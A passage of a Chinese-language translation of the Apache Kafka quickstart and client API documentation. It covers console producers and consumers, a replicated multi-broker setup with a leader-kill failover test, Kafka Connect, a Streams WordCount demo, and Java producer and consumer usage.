<p>创建好之后，可以通过运行以下命令，查看已创建的topic信息：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&gt; bin/kafka-topics.sh --list --zookeeper localhost:2181</span><br><span class="line"><span class="built_in">test</span></span><br></pre></td></tr></table></figure></p>
<p>或者，除了手工创建topic外，你也可以配置你的broker，当发布一个不存在的topic时自动创建topic。</p>
<h2 id="Step-4-发送消息"><a href="#Step-4-发送消息" class="headerlink" title="Step 4: 发送消息"></a>Step 4: 发送消息</h2><p>Kafka提供了一个命令行的工具，可以从输入文件或者命令行中读取消息并发送给Kafka集群。每一行是一条消息。</p>
<p>运行producer（生产者）,然后在控制台输入几条消息到服务器。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; bin/kafka-console-producer.sh --broker-list localhost:9092 --topic test</span><br><span class="line">This is a message</span><br><span class="line">This is another message</span><br></pre></td></tr></table></figure></p>
<h2 id="Step-5-消费消息"><a href="#Step-5-消费消息" class="headerlink" title="Step 5: 消费消息"></a>Step 5: 消费消息</h2><p>Kafka也提供了一个消费消息的命令行工具，将存储的信息输出出来。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; bin/kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic test --from-beginning</span><br><span class="line">This is a message</span><br><span class="line">This is another message</span><br></pre></td></tr></table></figure></p>
<p>如果你有2台不同的终端上运行上述命令，那么当你在运行生产者时，消费者就能消费到生产者发送的消息。</p>
<h2 id="Step-6-设置多个broker集群"><a href="#Step-6-设置多个broker集群" class="headerlink" title="Step 6: 设置多个broker集群"></a>Step 6: 设置多个broker集群</h2><p>到目前，我们只是单一的运行一个broker，没什么意思。对于Kafka，一个broker仅仅只是一个集群的大小，所有让我们多设几个broker。</p>
<p>首先为每个broker创建一个配置文件:<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&gt; cp config/server.properties config/server-1.properties </span><br><span class="line">&gt; cp config/server.properties config/server-2.properties</span><br></pre></td></tr></table></figure></p>
<p>现在编辑这些新建的文件，设置以下属性：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server-1.properties: </span><br><span class="line">    broker.id=1 </span><br><span class="line">    listeners=PLAINTEXT://:9093 </span><br><span class="line">    log.dir=/tmp/kafka-logs-1</span><br><span class="line"></span><br><span class="line">server-2.properties: </span><br><span class="line">    broker.id=2 </span><br><span class="line">    listeners=PLAINTEXT://:9094 </span><br><span class="line">    log.dir=/tmp/kafka-logs-2</span><br></pre></td></tr></table></figure></p>
<p>broker.id是集群中每个节点的唯一且永久的名称，我们修改端口和日志目录是因为我们现在在同一台机器上运行，我们要防止broker在同一端口上注册和覆盖对方的数据。</p>
<p>我们已经运行了zookeeper和刚才的一个kafka节点，所有我们只需要在启动2个新的kafka节点。(未通过)<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; bin/kafka-server-start.sh config/server-1.properties &amp;</span><br><span class="line">... </span><br><span class="line">&gt; bin/kafka-server-start.sh config/server-2.properties &amp;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>现在，我们创建一个新topic，把备份设置为：3<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 3 --partitions 1 --topic my-replicated-topic</span><br></pre></td></tr></table></figure></p>
<p>好了，现在我们已经有了一个集群了，我们怎么知道每个集群在做什么呢？运行命令“describe topics”<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; bin/kafka-topics.sh --describe --zookeeper localhost:2181 --topic my-replicated-topic</span><br><span class="line">Topic:my-replicated-topic    PartitionCount:1    ReplicationFactor:3    Configs:</span><br><span class="line">Topic: my-replicated-topic    Partition: 0    Leader: 1    Replicas: 1,2,0    Isr: 1,2,0</span><br></pre></td></tr></table></figure></p>
<p>输出解释：第一行是所有分区的摘要，其次，每一行提供一个分区信息，因为我们只有一个分区，所以只有一行。<br>1.”leader”：该节点负责该分区的所有的读和写，每个节点的leader都是随机选择的。<br>2.”replicas”：备份的节点列表，无论该节点是否是leader或者目前是否还活着，只是显示。<br>3.”isr”：“同步备份”的节点列表，也就是活着的节点并且正在同步leader。</p>
<p>我们运行这个命令，看看一开始我们创建的那个节点：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; bin/kafka-topics.sh --describe --zookeeper localhost:2181 --topic test</span><br><span class="line">Topic:test    PartitionCount:1    ReplicationFactor:1    Configs:</span><br><span class="line">Topic: test    Partition: 0    Leader: 0    Replicas: 0    Isr: 0</span><br></pre></td></tr></table></figure></p>
<p>这并不奇怪，刚才创建的主题没有Replicas，并且在服务器“0”上，我们创建它的时候，集群中只有一个服务器，所以是“0”。<br>让我们来发布一些信息在新的topic上：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; bin/kafka-console-producer.sh --broker-list localhost:9092 --topic my-replicated-topic</span><br><span class="line"> ...</span><br><span class="line">my test message 1</span><br><span class="line">my test message 2</span><br><span class="line">^C</span><br></pre></td></tr></table></figure></p>
<p>现在，消费这些消息。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; bin/kafka-console-consumer.sh --zookeeper localhost:2181 --from-beginning --topic my-replicated-topic</span><br><span class="line"> ...</span><br><span class="line">my test message 1</span><br><span class="line">my test message 2</span><br><span class="line">^C</span><br></pre></td></tr></table></figure></p>
<p>我们要测试集群的容错，kill掉leader，Broker1作为当前的leader，也就是kill掉Broker1。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; ps | grep server-1.properties</span><br><span class="line">7564 ttys002    0:15.91 /System/Library/Frameworks/JavaVM.framework/Versions/1.6/Home/bin/java... </span><br><span class="line">&gt; kill -9 7564</span><br></pre></td></tr></table></figure></p>
<p>在Windows上使用：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; wmic process where &quot;caption = &apos;java.exe&apos; and commandline like &apos;%server-1.properties%&apos;&quot; get processid</span><br><span class="line">ProcessId</span><br><span class="line">6016</span><br><span class="line">&gt; taskkill /pid 6016 /f</span><br></pre></td></tr></table></figure></p>
<p>备份节点之一成为新的leader，而broker1已经不在同步备份集合里了。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; bin/kafka-topics.sh --describe --zookeeper localhost:2181 --topic my-replicated-topic</span><br><span class="line">Topic:my-replicated-topic    PartitionCount:1    ReplicationFactor:3    Configs:</span><br><span class="line">Topic: my-replicated-topic    Partition: 0    Leader: 2    Replicas: 1,2,0    Isr: 2,0</span><br></pre></td></tr></table></figure></p>
<p>但是，消息仍然没丢：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; bin/kafka-console-consumer.sh --zookeeper localhost:2181 --from-beginning --topic my-replicated-topic</span><br><span class="line">...</span><br><span class="line">my test message 1</span><br><span class="line">my test message 2</span><br><span class="line">^C</span><br></pre></td></tr></table></figure></p>
<h2 id="Step-7-使用-Kafka-Connect-来-导入-导出-数据"><a href="#Step-7-使用-Kafka-Connect-来-导入-导出-数据" class="headerlink" title="Step 7: 使用 Kafka Connect 来 导入/导出 数据"></a>Step 7: 使用 Kafka Connect 来 导入/导出 数据</h2><p>从控制台写入和写回数据是一个方便的开始，但你可能想要从其他来源导入或导出数据到其他系统。对于大多数系统，可以使用kafka Connect，而不需要编写自定义集成代码。</p>
<p>Kafka Connect是导入和导出数据的一个工具。它是一个可扩展的工具，运行连接器，实现与自定义的逻辑的外部系统交互。在这个快速入门里，我们将看到如何运行Kafka Connect用简单的连接器从文件导入数据到Kafka主题，再从Kafka主题导出数据到文件。</p>
<p>首先，我们首先创建一些“种子”数据用来测试，（ps：种子的意思就是造一些消息，片友秒懂？）：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo -e &quot;foo\nbar&quot; &gt; test.txt</span><br></pre></td></tr></table></figure></p>
<p>windowns上：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; echo foo&gt; test.txt</span><br><span class="line">&gt; echo bar&gt;&gt; test.txt</span><br></pre></td></tr></table></figure></p>
<p>接下来，我们开始2个连接器运行在独立的模式，这意味着它们运行在一个单一的，本地的，专用的进程。我们提供3个配置文件作为参数。首先是Kafka Connect处理的配置，包含常见的配置，例如要连接的Kafka broker和数据的序列化格式。其余的配置文件都指定了要创建的连接器。包括连接器唯一名称，和要实例化的连接器类。以及连接器所需的任何其他配置。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; bin/connect-standalone.sh config/connect-standalone.properties config/connect-file-source.properties config/connect-file-sink.properties</span><br></pre></td></tr></table></figure></p>
<p>kafka附带了这些示例的配置文件，并且使用了刚才我们搭建的本地集群配置并创建了2个连接器：第一个是源连接器，从输入文件中读取并发布到Kafka主题中，第二个是接收连接器，从kafka主题读取消息输出到外部文件。</p>
<p>在启动过程中，你会看到一些日志消息，包括一些连接器实例化的说明。一旦kafka Connect进程已经开始，导入连接器应该读取从<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test.txt</span><br></pre></td></tr></table></figure></p>
<p>和写入到topic<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">connect-test</span><br></pre></td></tr></table></figure></p>
<p>导出连接器从主题<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">connect-test</span><br></pre></td></tr></table></figure></p>
<p>读取消息写入到文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test.sink.txt</span><br></pre></td></tr></table></figure></p>
<p>. 我们可以通过验证输出文件的内容来验证数据数据已经全部导出：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">more test.sink.txt</span><br><span class="line"> foo</span><br><span class="line"> bar</span><br></pre></td></tr></table></figure></p>
<p>注意，导入的数据也已经在Kafka主题<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">connect-test</span><br></pre></td></tr></table></figure></p>
<p>里,所以我们可以使用该命令查看这个主题：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bin/kafka-console-consumer.sh --zookeeper localhost:2181 --topic connect-test --from-beginning</span><br><span class="line"> &#123;&quot;schema&quot;:&#123;&quot;type&quot;:&quot;string&quot;,&quot;optional&quot;:false&#125;,&quot;payload&quot;:&quot;foo&quot;&#125;</span><br><span class="line">&#123;&quot;schema&quot;:&#123;&quot;type&quot;:&quot;string&quot;,&quot;optional&quot;:false&#125;,&quot;payload&quot;:&quot;bar&quot;&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>连接器继续处理数据，因此我们可以添加数据到文件并通过管道移动：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;Another line&quot; &gt;&gt; test.txt</span><br></pre></td></tr></table></figure></p>
<p>你应该会看到出现在消费者控台输出一行信息并导出到文件。</p>
<h2 id="Step-8-使用Kafka-Stream来处理数据-调试未通过"><a href="#Step-8-使用Kafka-Stream来处理数据-调试未通过" class="headerlink" title="Step 8: 使用Kafka Stream来处理数据 (调试未通过)"></a>Step 8: 使用Kafka Stream来处理数据 (调试未通过)</h2><p>Kafka Stream是kafka的客户端库，用于实时流处理和分析存储在kafka broker的数据，这个快速入门示例将演示如何运行一个流应用程序。一个WordCountDemo的例子（为了方便阅读，使用的是java8 lambda表达式）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">KTable wordCounts = textLines</span><br><span class="line">    // Split each text line, by whitespace, into words.</span><br><span class="line">    .flatMapValues(value -&gt; Arrays.asList(value.toLowerCase().split(&quot;W+&quot;)))</span><br><span class="line"></span><br><span class="line">    // Ensure the words are available as record keys for the next aggregate operation.</span><br><span class="line">    .map((key, value) -&gt; new KeyValue&lt;&gt;(value, value))</span><br><span class="line"></span><br><span class="line">    // Count the occurrences of each word (record key) and store the results into a table named &quot;Counts&quot;.</span><br><span class="line">    .countByKey(&quot;Counts&quot;)</span><br></pre></td></tr></table></figure></p>
<p>它实现了wordcount算法，从输入的文本计算出一个词出现的次数。然而，不像其他的WordCount的例子，你可能会看到，在有限的数据之前，执行的演示应用程序的行为略有不同，因为它的目的是在一个无限的操作，数据流。类似的有界变量，它是一种动态算法，跟踪和更新的单词计数。然而，由于它必须假设潜在的无界输入数据，它会定期输出其当前状态和结果，同时继续处理更多的数据，因为它不知道什么时候它处理过的“所有”的输入数据。</p>
<p>现在准备输入数据到kafka的topic中，随后kafka Stream应用处理这个topic的数据。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; echo -e &quot;all streams lead to kafka\nhello kafka streams\njoin kafka summit&quot; &gt; file-input.txt</span><br></pre></td></tr></table></figure></p>
<p>接下来，使用控制台的producer 将输入的数据发送到指定的topic（streams-file-input）中，（在实践中，stream数据可能会持续流入，其中kafka的应用将启动并运行）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; bin/kafka-topics.sh --create \</span><br><span class="line">            --zookeeper localhost:2181 \</span><br><span class="line">            --replication-factor 1 \</span><br><span class="line">            --partitions 1 \</span><br><span class="line">            --topic streams-file-input</span><br></pre></td></tr></table></figure></p>
<p>现在，我们运行 WordCount 处理输入的数据：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; ./bin/kafka-run-class org.apache.kafka.streams.examples.wordcount.WordCountDemo</span><br></pre></td></tr></table></figure></p>
<p>不会有任何的STDOUT输出，除了日志，结果不断地写回另一个topic（streams-wordcount-output），demo运行几秒，然后，不像典型的流处理应用程序，自动终止。</p>
<p>现在我们检查WordCountDemo应用，从输出的topic读取。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./bin/kafka-console-consumer --zookeeper localhost:2181 </span><br><span class="line">            --topic streams-wordcount-output </span><br><span class="line">            --from-beginning </span><br><span class="line">            --formatter kafka.tools.DefaultMessageFormatter </span><br><span class="line">            --property print.key=true </span><br><span class="line">            --property print.key=true </span><br><span class="line">            --property key.deserializer=org.apache.kafka.common.serialization.StringDeserializer </span><br><span class="line">            --property value.deserializer=org.apache.kafka.common.serialization.LongDeserializer</span><br></pre></td></tr></table></figure></p>
<p>输出数据打印到控台（你可以使用Ctrl-C停止）：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">all     1</span><br><span class="line">streams 1</span><br><span class="line">lead    1</span><br><span class="line">to      1</span><br><span class="line">kafka   1</span><br><span class="line">hello   1</span><br><span class="line">kafka   2</span><br><span class="line">streams 2</span><br><span class="line">join    1</span><br><span class="line">kafka   3</span><br><span class="line">summit  1</span><br><span class="line">^C</span><br></pre></td></tr></table></figure></p>
<p>第一列是message的key，第二列是message的value，要注意，输出的实际是一个连续的更新流，其中每条数据（即：原始输出的每行）是一个单词的最新的count，又叫记录键“kafka”。对于同一个key有多个记录，每个记录之后是前一个的更新。</p>
<h1 id="kafka的生态系统"><a href="#kafka的生态系统" class="headerlink" title="kafka的生态系统"></a>kafka的生态系统</h1><p>还有很多与kafka集成的外部的工具。更多信息点击这里，包含了stream处理系统，hadoop的集成，监控和部署工具。</p>
<h1 id="kafka接口API"><a href="#kafka接口API" class="headerlink" title="kafka接口API"></a>kafka接口API</h1><p>Apache Kafka引入一个新的java客户端（在org.apache.kafka.clients 包中），替代老的Scala客户端，但是为了兼容，将会共存一段时间。为了减少依赖，这些客户端都有一个独立的jar，而旧的Scala客户端继续与服务端保留在同个包下。</p>
<h2 id="Kafka有4个核心API："><a href="#Kafka有4个核心API：" class="headerlink" title="Kafka有4个核心API："></a>Kafka有4个核心API：</h2><p>1.Producer API 允许应用程序发送数据流到kafka集群中的topic。<br>2.Consumer API 允许应用程序从kafka集群的topic中读取数据流。<br>3.Streams API 允许从输入topic转换数据流到输出topic。<br>4.Connect API 通过实现连接器（connector），不断地从一些源系统或应用程序中拉取数据到kafka，或从kafka提交数据到宿系统（sink system）或应用程序。</p>
<p>kafka公开了其所有的功能协议，与语言无关。只有java客户端作为kafka项目的一部分进行维护，其他的作为开源的项目提供，这里提供了非java客户端的列表。<br><a href="https://cwiki.apache.org/confluence/display/KAFKA/Clients" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/KAFKA/Clients</a></p>
<p>#kafka生产者客户端（0.10.1.1API）</p>
<h2 id="kafka客户端发布record-消息-到kafka集群。"><a href="#kafka客户端发布record-消息-到kafka集群。" class="headerlink" title="kafka客户端发布record(消息)到kafka集群。"></a>kafka客户端发布record(消息)到kafka集群。</h2><p>新的生产者是线程安全的，在线程之间共享单个生产者实例，通常单例比多个实例要快。</p>
<p>一个简单的例子，使用producer发送一个有序的key/value(键值对)，放到java的main方法里就能直接运行，<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Properties props = <span class="keyword">new</span> Properties();</span><br><span class="line"> props.put(<span class="string">"bootstrap.servers"</span>, <span class="string">"localhost:9092"</span>);</span><br><span class="line"> props.put(<span class="string">"acks"</span>, <span class="string">"all"</span>);</span><br><span class="line"> props.put(<span class="string">"retries"</span>, <span class="number">0</span>);</span><br><span class="line"> props.put(<span class="string">"batch.size"</span>, <span class="number">16384</span>);</span><br><span class="line"> props.put(<span class="string">"linger.ms"</span>, <span class="number">1</span>);</span><br><span class="line"> props.put(<span class="string">"buffer.memory"</span>, <span class="number">33554432</span>);</span><br><span class="line"> props.put(<span class="string">"key.serializer"</span>, <span class="string">"org.apache.kafka.common.serialization.StringSerializer"</span>);</span><br><span class="line"> props.put(<span class="string">"value.serializer"</span>, <span class="string">"org.apache.kafka.common.serialization.StringSerializer"</span>);</span><br><span class="line"></span><br><span class="line"> Producer&lt;String, String&gt; producer = <span class="keyword">new</span> KafkaProducer&lt;&gt;(props);</span><br><span class="line"> <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">     producer.send(<span class="keyword">new</span> ProducerRecord&lt;String, String&gt;(<span class="string">"my-topic"</span>, Integer.toString(i), Integer.toString(i)));</span><br><span class="line"></span><br><span class="line"> producer.close();</span><br></pre></td></tr></table></figure></p>
<p> 生产者的缓冲空间池保留尚未发送到服务器的消息，后台I/O线程负责将这些消息转换成请求发送到集群。如果使用后不关闭生产者，则会泄露这些资源。</p>
<p>send()方法是异步的，添加消息到缓冲区等待发送，并立即返回。生产者将单个的消息批量在一起发送来提高效率。</p>
<p>ack是判别请求是否为完整的条件（就是是判断是不是成功发送了）。我们指定了“all”将会阻塞消息，这种设置性能最低，但是是最可靠的。</p>
<p>retries，如果请求失败，生产者会自动重试，我们指定是0次，如果启用重试，则会有重复消息的可能性。</p>
<p>producer(生产者)缓存每个分区未发送的消息。缓存的大小是通过 batch.size 配置指定的。值较大的话将会产生更大的批。并需要更多的内存（因为每个“活跃”的分区都有1个缓冲区）。<br>默认缓冲可立即发送，即便缓冲空间还没有满，但是，如果你想减少请求的数量，可以设置</p>
<p>linger.ms大于0。这将指示生产者发送请求之前等待一段时间，希望更多的消息填补到未满的批中。这类似于TCP的算法，例如上面的代码段，可能100条消息在一个请求发送，因为我们设置了linger(逗留)时间为1毫秒，然后，如果我们没有填满缓冲区，这个设置将增加1毫秒的延迟请求以等待更多的消息。需要注意的是，在高负载下，相近的时间一般也会组成批，即使是linger.ms=0。在不处于高负载的情况下，如果设置比0大，以少量的延迟代价换取更少的，更有效的请求。</p>
<p>buffer.memory 控制生产者可用的缓存总量，如果消息发送速度比其传输到服务器的快，将会耗尽这个缓存空间。当缓存空间耗尽，其他发送调用将被阻塞，阻塞时间的阈值通过max.block.ms设定，之后它将抛出一个TimeoutException。</p>
<p>key.serializer和value.serializer示例，将用户提供的key和value对象ProducerRecord转换成字节，你可以使用附带的ByteArraySerializaer或StringSerializer处理简单的string或byte类型。</p>
<h2 id="send"><a href="#send" class="headerlink" title="send()"></a>send()</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Future&lt;RecordMetadata&gt; <span class="title">send</span><span class="params">(ProducerRecord&lt;K,V&gt; record,Callback callback)</span></span></span><br></pre></td></tr></table></figure>
<p>异步发送一条消息到topic，并调用callback（当发送已确认）。</p>
<p>send是异步的，并且一旦消息被保存在等待发送的消息缓存中，此方法就立即返回。这样并行发送多条消息而不阻塞去等待每一条消息的响应。</p>
<p>发送的结果是一个RecordMetadata，它指定了消息发送的分区，分配的offset和消息的时间戳。如果topic使用的是CreateTime，则使用用户提供的时间戳或发送的时间（如果用户没有指定指定消息的时间戳）如果topic使用的是LogAppendTime，则追加消息时，时间戳是broker的本地时间。</p>
<p>由于send调用是异步的，它将为分配消息的此消息的RecordMetadata返回一个Future。如果future调用get()，则将阻塞，直到相关请求完成并返回该消息的metadata，或抛出发送异常。</p>
<p>如果要模拟一个简单的阻塞调用，你可以调用get()方法。<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] key = <span class="string">"key"</span>.getBytes();</span><br><span class="line"><span class="keyword">byte</span>[] value = <span class="string">"value"</span>.getBytes();</span><br><span class="line">ProducerRecord&lt;<span class="keyword">byte</span>[],<span class="keyword">byte</span>[]&gt; record = <span class="keyword">new</span> ProducerRecord&lt;<span class="keyword">byte</span>[],<span class="keyword">byte</span>[]&gt;(<span class="string">"my-topic"</span>, key, value)</span><br><span class="line">producer.send(record).get();</span><br></pre></td></tr></table></figure></p>
<p>完全无阻塞的话,可以利用回调参数提供的请求完成时将调用的回调通知。<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ProducerRecord&lt;<span class="keyword">byte</span>[],<span class="keyword">byte</span>[]&gt; record = <span class="keyword">new</span> ProducerRecord&lt;<span class="keyword">byte</span>[],<span class="keyword">byte</span>[]&gt;(<span class="string">"the-topic"</span>, key, value);</span><br><span class="line">producer.send(myRecord,</span><br><span class="line">              <span class="keyword">new</span> Callback() &#123;</span><br><span class="line">                  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCompletion</span><span class="params">(RecordMetadata metadata, Exception e)</span> </span>&#123;</span><br><span class="line">                      <span class="keyword">if</span>(e != <span class="keyword">null</span>)</span><br><span class="line">                          e.printStackTrace();</span><br><span class="line">                      System.out.println(<span class="string">"The offset of the record we just sent is: "</span> + metadata.offset());</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;);</span><br></pre></td></tr></table></figure></p>
<p>发送到同一个分区的消息回调保证按一定的顺序执行，也就是说，在下面的例子中 callback1 保证执行 callback2 之前：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">producer.send(<span class="keyword">new</span> ProducerRecord&lt;<span class="keyword">byte</span>[],<span class="keyword">byte</span>[]&gt;(topic, partition, key1, value1), callback1);</span><br><span class="line">producer.send(<span class="keyword">new</span> ProducerRecord&lt;<span class="keyword">byte</span>[],<span class="keyword">byte</span>[]&gt;(topic, partition, key2, value2), callback2);</span><br></pre></td></tr></table></figure></p>
<p>注意：callback一般在生产者的I/O线程中执行，所以是相当的快的，否则将延迟其他的线程的消息发送。如果你需要执行阻塞或计算昂贵（消耗）的回调，建议在callback主体中使用自己的Executor来并行处理。<br>pecified by:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">send in interface Producer&lt;K,V&gt;</span><br></pre></td></tr></table></figure></p>
<p>Parameters:</p>
<p>record - 发送的记录（消息）<br>callback - 用户提供的callback，服务器来调用这个callback来应答结果（null表示没有callback）。</p>
<p>Throws:</p>
<p>InterruptException - 如果线程在阻塞中断。<br>SerializationException - 如果key或value不是给定有效配置的serializers。<br>TimeoutException - 如果获取元数据或消息分配内存话费的时间超过max.block.ms。<br>KafkaException - Kafka有关的错误（不属于公共API的异常）。</p>
<h1 id="kafka生产者API"><a href="#kafka生产者API" class="headerlink" title="kafka生产者API"></a>kafka生产者API</h1><p>我们鼓励所有新开发的程序使用新的Java生产者，新的java生产者客户端比以前的Scala的客户端更快、功能更全面。通过下面的例子，引入Maven（可以更改新的版本号）。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.kafka&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;kafka-clients&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;0.10.1.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p>
<p>如何使用生产者，请点击这里。<br>对以前传统Scala生产者API感兴趣的，可以在点击这里。</p>
<h1 id="kafka消费者API"><a href="#kafka消费者API" class="headerlink" title="kafka消费者API"></a>kafka消费者API</h1><p>随着0.9.0版本，我们已经增加了一个新的Java消费者替换我们现有的基于zookeeper的高级和低级消费者。这个客户端还是测试版的质量。为了确保用户平滑升级，我们仍然维护旧的0.8版本的消费者客户端继续在0.9集群上工作，两个老的0.8 API的消费者（ 高级消费者 和 低级消费者）。</p>
<p>这个新的消费API，清除了0.8版本的高版本和低版本消费者之间的区别，你可以通过下面的maven，引入依赖到你的客户端。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.kafka&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;kafka-clients&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;0.10.1.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p>
<p>如何使用新的消费者，请点击这里。</p>
<h1 id="kafka消费者客户端（0-10-0-1API）"><a href="#kafka消费者客户端（0-10-0-1API）" class="headerlink" title="kafka消费者客户端（0.10.0.1API）"></a>kafka消费者客户端（0.10.0.1API）</h1><p>Kafka客户端从集群中消费消息，并透明地处理kafka集群中出现故障服务器，透明地调节适应集群中变化的数据分区。也和服务器交互，平衡均衡消费者。<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">KafkaConsumer</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;</span></span><br><span class="line"><span class="class"><span class="keyword">extends</span> <span class="title">Object</span></span></span><br><span class="line"><span class="class"><span class="keyword">implements</span> <span class="title">Consumer</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>消费者TCP长连接到broker来拉取消息。故障导致的消费者关闭失败，将会泄露这些连接，消费者不是线程安全的，可以查看更多关于Multi-threaded（多线程）处理的细节。</p>
<h2 id="跨版本兼容性"><a href="#跨版本兼容性" class="headerlink" title="跨版本兼容性"></a>跨版本兼容性</h2><p>该客户端可以与0.10.0或更新版本的broker集群进行通信。较早的版本可能不支持某些功能。例如，0.10.0broker不支持offsetsForTimes，因为此功能是在版本0.10.1中添加的。 如果你调用broker版本不可用的API时，将报 UnsupportedVersionException 异常。</p>
<h2 id="偏移量和消费者的位置"><a href="#偏移量和消费者的位置" class="headerlink" title="偏移量和消费者的位置"></a>偏移量和消费者的位置</h2><p>kafka为分区中的每条消息保存一个偏移量（offset），这个偏移量是该分区中一条消息的唯一标示符。也表示消费者在分区的位置。例如，一个位置是5的消费者(说明已经消费了0到4的消息)，下一个接收消息的偏移量为5的消息。实际上有两个与消费者相关的“位置”概念：</p>
<p>消费者的位置给出了下一条记录的偏移量。它比消费者在该分区中看到的最大偏移量要大一个。 它在每次消费者在调用poll(long)中接收消息时自动增长。</p>
<p>“已提交”的位置是已安全保存的最后偏移量，如果进程失败或重新启动时，消费者将恢复到这个偏移量。消费者可以选择定期自动提交偏移量，也可以选择通过调用commit API来手动的控制(如：commitSync 和 commitAsync)。</p>
<p>这个区别是消费者来控制一条消息什么时候才被认为是已被消费的，控制权在消费者，下面我们进一步更详细地讨论。</p>
<h2 id="消费者组和主题订阅"><a href="#消费者组和主题订阅" class="headerlink" title="消费者组和主题订阅"></a>消费者组和主题订阅</h2><p>Kafka的消费者组概念，通过进程池瓜分消息并处理消息。这些进程可以在同一台机器运行，也可分布到多台机器上，以增加可扩展性和容错性，相同group.id的消费者将视为同一个消费者组。</p>
<p>分组中的每个消费者都通过subscribe API动态的订阅一个topic列表。kafka将已订阅topic的消息发送到每个消费者组中。并通过平衡分区在消费者分组中所有成员之间来达到平均。因此每个分区恰好地分配1个消费者（一个消费者组中）。所有如果一个topic有4个分区，并且一个消费者分组有只有2个消费者。那么每个消费者将消费2个分区。</p>
<p>消费者组的成员是动态维护的：如果一个消费者故障。分配给它的分区将重新分配给同一个分组中其他的消费者。同样的，如果一个新的消费者加入到分组，将从现有消费者中移一个给它。这被称为重新平衡分组，并在下面更详细地讨论。当新分区添加到订阅的topic时，或者当创建与订阅的正则表达式匹配的新topic时，也将重新平衡。将通过定时刷新自动发现新的分区，并将其分配给分组的成员。</p>
<p>从概念上讲，你可以将消费者分组看作是由多个进程组成的单一逻辑订阅者。作为一个多订阅系统，Kafka支持对于给定topic任何数量的消费者组，而不重复。</p>
<p>这是在消息系统中常见的功能的略微概括。所有进程都将是单个消费者分组的一部分（类似传统消息传递系统中的队列的语义），因此消息传递就像队列一样，在组中平衡。与传统的消息系统不同的是，虽然，你可以有多个这样的组。但每个进程都有自己的消费者组（类似于传统消息系统中pub-sub的语义），因此每个进程都会订阅到该主题的所有消息。</p>
<p>此外，当分组重新分配自动发生时，可以通过ConsumerRebalanceListener通知消费者，这允许他们完成必要的应用程序级逻辑，例如状态清除，手动偏移提交等。有关更多详细信息，请参阅Kafka存储的偏移。</p>
<p>它也允许消费者通过使用assign(Collection)手动分配指定分区，如果使用手动指定分配分区，那么动态分区分配和协调消费者组将失效。</p>
